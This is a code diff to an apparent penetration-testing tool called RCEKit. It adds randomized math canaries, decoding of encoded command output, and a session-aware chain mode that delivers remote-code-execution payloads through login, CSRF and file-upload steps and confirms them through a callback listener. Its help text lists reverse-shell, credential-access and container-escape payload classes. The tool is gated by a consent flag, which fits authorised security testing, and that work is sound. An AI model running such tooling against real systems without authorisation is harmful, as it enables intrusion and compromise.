@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.7.0"
+__version__ = "2.8.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -812,6 +812,7 @@ class RCEKit:
                 working = payload
                 token: Optional[str] = None
                 oob_host: Optional[str] = None
+                math_match: Optional[str] = None
                 exp_channel = expected_channel
                 ind = indicator
                 if "{oob}" in working and oob_domain:
@@ -823,6 +824,16 @@ class RCEKit:
                 elif "{canary}" in working:
                     token = self._generate_canary()
                     working = working.replace("{canary}", token)
+                elif "{math}" in working:
+                    # Randomized arithmetic canary for template/expression sinks.
+                    # A fixed 7*7=49 collides with any '49' already in the page
+                    # (dates, counters, ids) and is reported inconclusive; a random
+                    # 4-digit product is effectively unique, so its appearance is
+                    # proof the engine evaluated the expression, not a coincidence.
+                    a = random.randint(1000, 9999)
+                    b = random.randint(1000, 9999)
+                    working = working.replace("{math}", f"{a}*{b}")
+                    math_match = rf"(^|\D){a * b}(\D|$)"
 
                 # Decide separator-validity on the canonical payload, before any
                 # encoding hides (or spuriously reveals) the leading separator.
@@ -855,6 +866,8 @@ class RCEKit:
                 # matches the response regardless of how the payload was encoded.
                 if exp_channel in {"interactsh", "timing"}:
                     match = None
+                elif math_match is not None:
+                    match = math_match
                 elif token is not None:
                     match = re.escape(token)
                 else:
@@ -1428,8 +1441,8 @@ class RCEKit:
         if status is None:
             return "error", body[:80]
         if record.match:
-            if re.search(record.match, body):
-                if control_body and re.search(record.match, control_body):
+            if self._encoded_search(record.match, body):
+                if control_body and self._encoded_search(record.match, control_body):
                     if record.token:
                         return "inconclusive", ("canary reflected by the target in an inert control "
                                                 "(no execution needed), so the match is not proof")
@@ -1437,6 +1450,42 @@ class RCEKit:
                 return "confirmed", f"matched /{record.match}/"
             return "no-match", ""
         return "no-signature", "no machine-readable oracle for this payload"
+
+    def _encoded_search(self, pattern: str, body: str) -> bool:
+        """Match ``pattern`` against the response body AND against it after peeling
+        common output wrappers. A sink that base64/hex-encodes, URL-encodes,
+        HTML-escapes, or JSON/unicode-escapes the command output would otherwise
+        hide a genuine hit (e.g. ``dWlkPTA=`` instead of ``uid=0``). Every decode
+        is best-effort and additive: the raw body is always checked first, so this
+        only ever turns a missed confirmation into a hit, never the reverse."""
+        import base64, binascii, html as _html, urllib.parse, codecs
+        if re.search(pattern, body):
+            return True
+        candidates: List[str] = []
+        try:
+            candidates.append(urllib.parse.unquote(body))
+        except Exception:
+            pass
+        try:
+            candidates.append(_html.unescape(body))
+        except Exception:
+            pass
+        try:
+            candidates.append(codecs.decode(body, "unicode_escape"))
+        except Exception:
+            pass
+        for token in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", body):
+            try:
+                decoded = base64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8", "replace")
+                candidates.append(decoded)
+            except (binascii.Error, ValueError):
+                continue
+        for token in re.findall(r"(?:[0-9a-fA-F]{2}){8,}", body):
+            try:
+                candidates.append(bytes.fromhex(token).decode("utf-8", "replace"))
+            except ValueError:
+                continue
+        return any(re.search(pattern, c) for c in candidates)
 
     def run_verification(self, records: Iterator[PayloadRecord], url: str, method: str = "GET",
                          data: Optional[str] = None, headers: Optional[List[str]] = None,
@@ -1540,6 +1589,150 @@ class RCEKit:
                 time.sleep(delay)
             if max_payloads and len(results) >= max_payloads:
                 break
+        return results
+
+    def run_verification_chain(self, records: Iterator[PayloadRecord], chain: Dict[str, Any],
+                               delay: float = 0.0, timeout: float = 20.0,
+                               max_payloads: Optional[int] = None) -> List[Dict[str, Any]]:
+        """Deliver each payload through a multi-step, session-aware request chain
+        (login -> CSRF extraction -> prerequisite requests -> payload delivery ->
+        trigger), then confirm execution either in-band (the payload's ``match``
+        oracle against a chosen step's response) or out-of-band (a ``{callback}``
+        URL received by RCEKit's own OOB listener). This reaches sinks that a
+        single stateless request cannot: authenticated flows, injection carried in
+        uploaded file content, and blind/async execution.
+
+        ``chain`` keys: ``base`` (URL prefix), ``steps`` (ordered list),
+        ``confirm_step`` (name/index whose response is matched; default last),
+        ``callback_host`` and ``listen_port`` (OOB listener the target calls back
+        to). Each step: ``method``, ``path``, optional ``headers``, and one body of
+        ``body`` (raw), ``json`` (string), ``form`` (dict) or ``multipart``
+        (``{"fields": {...}, "file": {"field","filename","content"}}``). ``FUZZ``
+        anywhere in a step's body/content is where the payload lands; ``{var}`` is
+        substituted from earlier steps' ``extract`` ({var: regex-with-one-group}).
+        """
+        import time, os, json as _json, http.cookiejar, urllib.request, urllib.parse
+
+        base = chain.get("base", "").rstrip("/")
+        steps = chain["steps"]
+        confirm_key = chain.get("confirm_step")
+        callback_host = chain.get("callback_host")
+        listen_port = int(chain.get("listen_port", 0) or 0)
+
+        listener = None
+        if listen_port:
+            listener = OOBListener()
+            listener.start_http(listen_port)
+            logger.info("Chain OOB listener on port %s", listen_port)
+
+        def subst(text: str, ctx: Dict[str, str]) -> str:
+            for key, val in ctx.items():
+                text = text.replace("{" + key + "}", val)
+            return text
+
+        def run_steps(payload: str, token: str) -> Tuple[Dict[str, str], str]:
+            cj = http.cookiejar.CookieJar()
+            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+            # Seed the token so a profile can give each payload a unique filename /
+            # path ({token}) — essential when delivery writes to a shared location
+            # and an async trigger would otherwise read another payload's content.
+            ctx: Dict[str, str] = {"token": token}
+            if listener is not None and callback_host:
+                cb = f"http://{callback_host}:{listen_port}/{token}"
+                payload = payload.replace("{callback}", cb)
+                listener.tokens[token] = {"payload": payload, "category": "chain", "context": "chain"}
+            confirm_body = ""
+            for idx, step in enumerate(steps):
+                path = subst(step["path"], ctx)
+                url = path if path.startswith("http") else base + path
+                headers = {k: subst(v, ctx).replace("FUZZ", payload)
+                           for k, v in (step.get("headers") or {}).items()}
+                data = None
+                if "multipart" in step:
+                    mp = step["multipart"]
+                    boundary = "----rcekitChain"
+                    parts = []
+                    for fname, fval in (mp.get("fields") or {}).items():
+                        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{fname}\"\r\n\r\n"
+                                     f"{subst(str(fval), ctx).replace('FUZZ', payload)}\r\n")
+                    fl = mp.get("file")
+                    body = "".join(parts).encode()
+                    if fl:
+                        content = subst(str(fl.get("content", "")), ctx).replace("FUZZ", payload)
+                        filename = subst(str(fl.get("filename", "file")), ctx).replace("FUZZ", payload)
+                        body += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{fl['field']}\"; "
+                                 f"filename=\"{filename}\"\r\n"
+                                 f"Content-Type: application/octet-stream\r\n\r\n").encode() + content.encode()
+                    body += f"\r\n--{boundary}--\r\n".encode()
+                    data = body
+                    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
+                elif "json" in step:
+                    data = subst(step["json"], ctx).replace("FUZZ", payload).encode()
+                    headers.setdefault("Content-Type", "application/json")
+                elif "form" in step:
+                    form = {k: subst(str(v), ctx).replace("FUZZ", payload) for k, v in step["form"].items()}
+                    data = urllib.parse.urlencode(form).encode()
+                    headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
+                elif "body" in step:
+                    data = subst(step["body"], ctx).replace("FUZZ", payload).encode()
+                req = urllib.request.Request(url, data=data, headers=headers,
+                                             method=step.get("method", "GET" if data is None else "POST"))
+                try:
+                    with opener.open(req, timeout=timeout) as resp:
+                        text = resp.read().decode(errors="replace")
+                except urllib.error.HTTPError as exc:
+                    text = exc.read().decode(errors="replace")
+                except Exception as exc:
+                    text = str(exc)
+                for var, rgx in (step.get("extract") or {}).items():
+                    m = re.search(rgx, text)
+                    if m:
+                        ctx[var] = m.group(1)
+                if confirm_key in (step.get("name"), idx) or (confirm_key is None and idx == len(steps) - 1):
+                    confirm_body = text
+            return ctx, confirm_body
+
+        results: List[Dict[str, Any]] = []
+        seen: Set[str] = set()
+        pending_oob: List[Dict[str, Any]] = []
+        for record in records:
+            if record.payload in seen:
+                continue
+            seen.add(record.payload)
+            token = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
+            _, confirm_body = run_steps(record.payload, token)
+            is_oob = "{callback}" in record.payload
+            if is_oob:
+                pending_oob.append({"record": record, "token": token})
+                verdict, detail = "oob-pending", f"awaiting callback token {token}"
+            elif record.match and self._encoded_search(record.match, confirm_body):
+                verdict, detail = "confirmed", f"matched /{record.match}/"
+            elif record.match:
+                verdict, detail = "no-match", ""
+            else:
+                verdict, detail = "no-signature", "no in-band oracle; deliver as OOB to confirm"
+            results.append({"verdict": verdict, "detail": detail, "payload": record.payload,
+                            "category": record.category, "context": record.context, "token": token})
+            if delay:
+                time.sleep(delay)
+            if max_payloads and len(results) >= max_payloads:
+                break
+
+        # Give blind/async callbacks a moment to arrive, then resolve OOB verdicts.
+        if pending_oob and listener is not None:
+            deadline = time.time() + 6
+            while time.time() < deadline:
+                hit_tokens = {h.get("token") for h in listener.hits}
+                if all(p["token"] in hit_tokens for p in pending_oob):
+                    break
+                time.sleep(0.5)
+            hit_tokens = {h.get("token") for h in listener.hits}
+            for result in results:
+                if result["token"] in hit_tokens and result["verdict"] == "oob-pending":
+                    result["verdict"] = "confirmed"
+                    result["detail"] = f"OOB callback received for token {result['token']}"
+                elif result["verdict"] == "oob-pending":
+                    result["detail"] = f"no callback received for token {result['token']}"
         return results
 
     def log_exploitation_usage(self, watermark_token: str, arguments: argparse.Namespace) -> None:
@@ -1806,6 +1999,11 @@ def main():
                              "back reverse shells, download-execute, credential access, lateral movement, "
                              "container escape, cloud-metadata and OOB payloads; pass 'intrusive' to include "
                              "them. Independent of --max-safety, which only governs file output")
+    parser.add_argument("--verify-chain", default=None,
+                        help="Path to a JSON chain profile: deliver each payload through a multi-step, "
+                             "session-aware flow (login/CSRF -> prerequisites -> payload delivery -> trigger) "
+                             "and confirm in-band (match oracle) or out-of-band (a {callback} URL to the "
+                             "built-in listener). Reaches authenticated, file-content and blind/async sinks.")
     parser.add_argument("--doctor", action="store_true",
                         help="Run a corpus integrity check (template found, parses, payload counts) and exit non-zero if it is missing or empty")
     parser.add_argument("--listen", action="store_true",
@@ -1958,6 +2156,42 @@ def main():
         max_safety = "intrusive"
         if not oob_domain:
             oob_domain = "oob.interact.sh"
+
+    if args.verify_chain:
+        if not args.acknowledge_consent:
+            print("[!] --verify-chain actively sends payloads to the target. Re-run with "
+                  "--acknowledge-consent to confirm you are authorised to test it.")
+            return
+        with open(args.verify_chain, "r", encoding="utf-8") as chain_file:
+            chain = json.load(chain_file)
+        verify_max_safety = args.verify_active_risk or "safe"
+        records = generator.generate_payload_records(
+            selected_contexts=selected_contexts, selected_categories=selected_categories,
+            selected_encodings=selected_encodings, selected_environments=selected_environments,
+            mode=mode, watermark_token=watermark_token, max_safety=verify_max_safety,
+            include_blocking=include_blocking, oob_domain=oob_domain,
+        )
+        records = list(records)
+        verify_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+        generator.log_exploitation_usage(f"VERIFY-CHAIN:{verify_token} base={chain.get('base')}", args)
+        print(f"[verify-chain] {chain.get('base')}  ({len(chain.get('steps', []))} steps, "
+              f"{len(records)} payloads)  (authorised target)")
+        results = generator.run_verification_chain(
+            records, chain, delay=args.verify_delay, timeout=args.verify_timeout,
+            max_payloads=args.max_payloads)
+        by_verdict: Dict[str, int] = {}
+        for result in results:
+            by_verdict[result["verdict"]] = by_verdict.get(result["verdict"], 0) + 1
+        confirmed = [r for r in results if r["verdict"] == "confirmed"]
+        print(f"[verify-chain] sent {len(results)} unique payloads: " +
+              ", ".join(f"{v}={c}" for v, c in sorted(by_verdict.items())))
+        if confirmed:
+            print(f"\n[verify-chain] CONFIRMED execution ({len(confirmed)}):")
+            for result in confirmed:
+                print(f"  [{result['category']}] {result['payload']!r}   ({result['detail']})")
+        else:
+            print("\n[verify-chain] No execution confirmed.")
+        return
 
     if args.verify_url:
         if not args.acknowledge_consent:
